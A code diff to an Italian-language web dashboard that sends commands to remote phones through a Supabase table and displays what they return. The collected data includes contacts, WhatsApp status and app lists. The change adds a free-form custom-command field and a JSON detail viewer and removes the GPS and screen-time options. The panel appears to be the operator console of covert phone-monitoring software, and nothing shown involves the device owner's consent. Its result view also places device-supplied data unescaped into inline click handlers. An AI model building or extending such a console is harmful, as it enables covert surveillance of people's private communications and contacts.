@@ -40,6 +40,13 @@
         .result-item { background: #f9fafb; padding: 1rem; border-radius: 0.375rem; margin-bottom: 0.5rem; border-left: 4px solid #10b981; }
         .result-key { font-weight: 600; font-size: 0.875rem; color: #2563eb; }
         .result-value { font-size: 0.875rem; color: #6b7280; margin-top: 0.25rem; word-break: break-all; }
+        .custom-command-input { width: 100%; padding: 0.75rem; border: 1px solid #d1d5db; border-radius: 0.375rem; font-size: 0.875rem; margin-bottom: 0.5rem; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
+        .modal.active { display: flex; }
+        .modal-content { background: white; padding: 2rem; border-radius: 0.5rem; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto; }
+        .modal-header { font-size: 1.25rem; font-weight: 600; margin-bottom: 1rem; }
+        .modal-close { float: right; cursor: pointer; font-size: 1.5rem; color: #6b7280; }
+        .modal-close:hover { color: #1f2937; }
         @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
     </style>
 </head>
@@ -77,15 +84,19 @@
             <h2>⚡ Comandi On-Demand</h2>
             <p style="color: #6b7280; margin-bottom: 1rem; font-size: 0.875rem;">Seleziona un dispositivo per inviare comandi</p>
             
-            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 0.5rem;">
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 0.5rem; margin-bottom: 1rem;">
                 <button class="btn btn-primary" onclick="sendCommand('get_device_info')">📱 Info</button>
                 <button class="btn btn-success" onclick="sendCommand('get_apps')">📲 App</button>
                 <button class="btn btn-warning" onclick="sendCommand('get_battery')">🔋 Batteria</button>
                 <button class="btn btn-primary" onclick="sendCommand('get_contacts')">📞 Contatti</button>
                 <button class="btn btn-success" onclick="sendCommand('get_whatsapp')">💬 WhatsApp</button>
-                <button class="btn btn-warning" onclick="sendCommand('get_location')">📍 GPS</button>
-                <button class="btn btn-primary" onclick="sendCommand('get_screen_time')">⏱️ Schermo</button>
                 <button class="btn btn-danger" onclick="sendCommand('get_installed_apps')">📦 App Inst.</button>
+            </div>
+
+            <div style="border-top: 1px solid #e5e7eb; padding-top: 1rem;">
+                <p style="font-size: 0.875rem; color: #6b7280; margin-bottom: 0.5rem;">🔧 Comando personalizzato:</p>
+                <input type="text" id="customCommandInput" class="custom-command-input" placeholder="Scrivi il nome del comando (es: get_device_info)">
+                <button class="btn btn-primary" onclick="sendCustomCommand()">Invia Comando</button>
             </div>
         </div>
 
@@ -94,6 +105,15 @@
             <div id="resultsList" style="max-height: 400px; overflow-y: auto;">
                 <p class="loading">Nessun risultato ancora</p>
             </div>
+        </div>
+    </div>
+
+    <!-- Modal per visualizzare JSON -->
+    <div class="modal" id="jsonModal">
+        <div class="modal-content">
+            <span class="modal-close" onclick="closeModal()">✕</span>
+            <div class="modal-header">Dettagli Completi</div>
+            <pre id="jsonContent" style="background: #f9fafb; padding: 1rem; border-radius: 0.375rem; overflow-x: auto; font-size: 0.75rem;"></pre>
         </div>
     </div>
 
@@ -186,51 +206,38 @@
             const result = data[0];
             let html = '';
 
-            // Device Info
             if (result.device_info) {
-                html += `<div class="result-item">
+                html += `<div class="result-item" onclick="showJson(${JSON.stringify(result.device_info).replace(/"/g, '&quot;')})">
                     <div class="result-key">📱 Info Dispositivo</div>
                     <div class="result-value">${JSON.stringify(result.device_info).substring(0, 200)}</div>
                 </div>`;
             }
 
-            // Battery
             if (result.battery_info && Object.keys(result.battery_info).length > 0) {
-                html += `<div class="result-item">
+                html += `<div class="result-item" onclick="showJson(${JSON.stringify(result.battery_info).replace(/"/g, '&quot;')})">
                     <div class="result-key">🔋 Batteria</div>
                     <div class="result-value">${JSON.stringify(result.battery_info).substring(0, 200)}</div>
                 </div>`;
             }
 
-            // Apps
             if (result.open_apps && result.open_apps.length > 0) {
-                html += `<div class="result-item">
+                html += `<div class="result-item" onclick="showJson(${JSON.stringify(result.open_apps).replace(/"/g, '&quot;')})">
                     <div class="result-key">📲 App Aperte (${result.open_apps.length})</div>
                     <div class="result-value">${result.open_apps.slice(0, 5).join(', ')}</div>
                 </div>`;
             }
 
-            // WhatsApp
             if (result.whatsapp_status) {
-                html += `<div class="result-item">
+                html += `<div class="result-item" onclick="showJson(${JSON.stringify(result.whatsapp_status).replace(/"/g, '&quot;')})">
                     <div class="result-key">💬 WhatsApp</div>
                     <div class="result-value">${JSON.stringify(result.whatsapp_status).substring(0, 200)}</div>
                 </div>`;
             }
 
-            // Location
-            if (result.location && Object.keys(result.location).length > 0) {
-                html += `<div class="result-item">
-                    <div class="result-key">📍 Posizione</div>
-                    <div class="result-value">${JSON.stringify(result.location).substring(0, 200)}</div>
-                </div>`;
-            }
-
-            // Screen Time
-            if (result.screen_time && Object.keys(result.screen_time).length > 0) {
-                html += `<div class="result-item">
-                    <div class="result-key">⏱️ Tempo Schermo</div>
-                    <div class="result-value">${JSON.stringify(result.screen_time).substring(0, 200)}</div>
+            if (result.installed_apps && result.installed_apps.length > 0) {
+                html += `<div class="result-item" onclick="showJson(${JSON.stringify(result.installed_apps).replace(/"/g, '&quot;')})">
+                    <div class="result-key">📦 App Installate (${result.installed_apps.length})</div>
+                    <div class="result-value">${result.installed_apps.slice(0, 5).join(', ')}</div>
                 </div>`;
             }
 
@@ -264,6 +271,52 @@
                 alert('❌ Errore nell\'invio del comando');
                 console.error(error);
             }
+        }
+
+        async function sendCustomCommand() {
+            if (!selectedDevice) {
+                alert('Seleziona un dispositivo!');
+                return;
+            }
+
+            const command = document.getElementById('customCommandInput').value.trim();
+            if (!command) {
+                alert('Scrivi un comando!');
+                return;
+            }
+
+            try {
+                const { error } = await sbClient
+                    .from('commands')
+                    .insert([{
+                        device_id: selectedDevice.id,
+                        command: command,
+                        params: {},
+                        status: 'pending'
+                    }]);
+
+                if (error) throw error;
+                alert(`✅ Comando "${command}" inviato!`);
+                document.getElementById('customCommandInput').value = '';
+                setTimeout(loadResults, 2000);
+            } catch (error) {
+                alert('❌ Errore nell\'invio del comando');
+                console.error(error);
+            }
+        }
+
+        function showJson(jsonStr) {
+            try {
+                const json = typeof jsonStr === 'string' ? JSON.parse(jsonStr) : jsonStr;
+                document.getElementById('jsonContent').textContent = JSON.stringify(json, null, 2);
+                document.getElementById('jsonModal').classList.add('active');
+            } catch (e) {
+                alert('Errore nella visualizzazione dei dati');
+            }
+        }
+
+        function closeModal() {
+            document.getElementById('jsonModal').classList.remove('active');
         }
 
         loadDevices();
